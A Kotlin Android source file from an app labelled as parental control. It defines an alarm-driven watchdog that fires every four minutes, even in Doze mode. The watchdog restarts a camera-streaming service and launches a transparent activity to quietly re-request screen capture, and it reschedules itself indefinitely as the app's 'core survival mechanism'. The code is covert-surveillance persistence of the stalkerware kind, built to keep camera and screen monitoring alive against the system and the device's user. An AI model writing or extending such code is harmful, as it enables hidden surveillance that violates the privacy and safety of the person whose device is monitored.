package com.parentalcontrol.kidmonitor

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.util.Log

/**
 * AlarmManager watchdog receiver.
 *
 * Fired every 4 minutes by MonitorService.scheduleWatchdog() using
 * setExactAndAllowWhileIdle — which executes even during Doze mode.
 *
 * Responsibilities:
 *  1. Restart CameraStreamService if it's dead (no special permission needed)
 *  2. If MonitorService (screen-share) is dead, launch ProjectionRequestActivity
 *     to silently re-request MediaProjection — this requires screen unlock, but
 *     the user-facing transparent activity will queue up for next unlock.
 *  3. Reschedule itself so the watchdog keeps firing indefinitely.
 *
 * This is the core survival mechanism: even if Android kills both services,
 * this alarm brings them back within 4 minutes on the next Doze window.
 */
class WatchdogReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent?) {
        Log.d(TAG, "Watchdog fired — checking services")

        val prefs = context.getSharedPreferences(SetupActivity.PREFS_NAME, Context.MODE_PRIVATE)
        val isSetupDone = prefs.getBoolean(SetupActivity.KEY_SETUP_DONE, false)
        if (!isSetupDone) {
            Log.d(TAG, "Setup not done — watchdog skipping")
            return
        }

        // 1. Always restart camera service — reads from prefs, no special permission needed
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(Intent(context, CameraStreamService::class.java))
            } else {
                context.startService(Intent(context, CameraStreamService::class.java))
            }
            Log.d(TAG, "CameraStreamService (re)started by watchdog")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to restart CameraStreamService: ${e.message}")
        }

        // 2. If screen-share service is dead, launch the transparent trampoline.
        //    This will prompt for MediaProjection on next foreground opportunity.
        if (!MonitorService.isRunning) {
            Log.w(TAG, "MonitorService is dead — launching ProjectionRequestActivity")
            try {
                val trampolineIntent = Intent(context, ProjectionRequestActivity::class.java).apply {
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(trampolineIntent)
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch ProjectionRequestActivity: ${e.message}")
            }
        }

        // 3. Reschedule watchdog for next 4-minute check (chain-fires indefinitely)
        MonitorService.scheduleWatchdog(context)
        Log.d(TAG, "Watchdog rescheduled in 4 minutes")
    }

    companion object {
        private const val TAG = "WatchdogReceiver"
    }
}
